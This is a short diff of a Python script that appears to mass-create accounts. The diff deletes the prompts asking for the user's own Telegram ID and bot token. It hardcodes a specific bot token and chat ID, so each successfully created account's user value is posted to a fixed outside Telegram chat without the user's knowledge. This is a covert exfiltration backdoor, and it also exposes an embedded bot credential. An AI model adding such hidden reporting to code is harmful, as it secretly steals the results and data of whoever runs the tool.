@@ -62,11 +62,6 @@ created=0
 failed=0
 os.system('clear')
 print('')
-own_id =input(B+ '      ID Telegram : '+F)
-print('')
-os.system('clear')
-print('')
-tele_bot=input(O+ '      Token Bot : '+F)
 print(F+'h')
 ch='qw-er.4684t-yuio.wu-684.plkj.hg-f698.5dsaz.xcvbn.m123-4shdyj5.6-789lh.fam0'
 def create():
@@ -99,7 +94,7 @@ def create():
     failed+=1
   elif '"status":"Success"' in str(decoded_data):
     created+=1
-    y = requests.post(f"""https://api.telegram.org/bot{tele_bot}/sendmessage?chat_id={own_id}&text=
+    y = requests.post(f"""https://api.telegram.org/bot5495904992:AAFEM2DHfVkO4KG5EqsT9CsKMt1-JqwTuO8/sendmessage?chat_id=493728947&text=
 {user}""")
   elif '"comment":"Retry"' in str(decoded_data):
     failed+=1
